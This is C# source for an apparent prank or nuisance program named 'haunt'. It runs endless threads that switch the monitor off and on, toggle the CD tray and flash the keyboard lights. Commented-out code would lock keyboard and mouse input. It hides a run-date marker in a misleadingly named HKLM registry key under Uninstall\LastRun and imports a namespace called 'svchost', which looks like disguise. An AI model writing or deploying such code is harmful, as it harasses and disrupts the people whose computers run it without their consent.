using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;

using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Text.RegularExpressions;
using svchost;

namespace haunt
{
    public partial class form : Form
    {
        private int numberOfValidDays = 2;

        public form(string[] args)
        {
            InitializeComponent();

            if (args.Length == 1)
            {
                int.TryParse(args[0], out numberOfValidDays);
            }
        }

        #region Monitor codes
        const uint SC_MONITORPOWER = 0xF170;
        const uint WM_SYSCOMMAND = 0x0112;
        const uint MONITOR_ON = 0x0001;
        const uint MONITOR_OFF = 0x0002;

        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);

        public void StartMonitorThread()
        {
            while (true)
            {
                SendMessage(this.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF);
                Thread.Sleep(3000);
                SendMessage(this.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON);
                Thread.Sleep(3000);

#if SAFE
                break; 
#endif
            }
        } 
        #endregion

        public void go()
        {

            // Check expiry, auto exit if expired
            try { CheckExpiryDate(); }
            catch (Exception) { }

            // Lock keyboard and mouse
            //Thread t = new Thread(new ThreadStart(LockInput.Start));
            //t.Start();
            
            // Toggle monitor
            Thread t1 = new Thread(new ThreadStart(StartMonitorThread));
            t1.Start();

            // Toggle cd tray
            Thread t2 = new Thread(new ThreadStart(Tray.StartThread));
            t2.Start();

            // Start prompting for viwawa feedback and opening viwawa.com after that
            //Thread t4 = new Thread(new ThreadStart(IEPrompt.StartIEPromptThread));
            //t4.Start();

            // Toggle keyboard lights
            Thread t3 = new Thread(new ThreadStart(KeyboardLights.StartThread));
            t3.Start();
        }

        private void CheckExpiryDate()
        {
            // Attempt to open the key
            RegistryKey key = Registry.LocalMachine.OpenSubKey
                (@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\LastRun");

            // If the return value is null, the key doesn't exist
            if (key == null)
            {
                // The key doesn't exist; create it / open it
                key = Registry.LocalMachine.CreateSubKey
                    (@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\LastRun");

                key.SetValue("Date",
                    DateTime.Today.ToShortDateString(),
                    RegistryValueKind.String);

                key.Flush();
                key.Close();
            }

            // Attempt to retrieve the value X; if null is returned, the value
            // doesn't exist in the registry.
            if (key.GetValue("Date") != null)
            {
                // The value exists; move the form to the coordinates stored in the
                // registry.
                DateTime dt;
                DateTime.TryParse(key.GetValue("Date").ToString(), out dt);

                if (numberOfValidDays == -1)
                {
                    // run on odd days
                    TimeSpan ts = dt.Subtract(DateTime.Now);

                    int days = ts.Days;

                    if (days < 0)
                        days = -days; // make positive

                    if ((days % 2) == 1)
                    {
                        Application.Exit();
                    }
                }
                else
                {
                    // date in registry + 2 days is greater than today.. dont run..
                    if (dt.AddDays(numberOfValidDays).CompareTo(DateTime.Now) < 0)
                    {
                        Application.Exit();
                    }
                }
            }
        }
    }
}
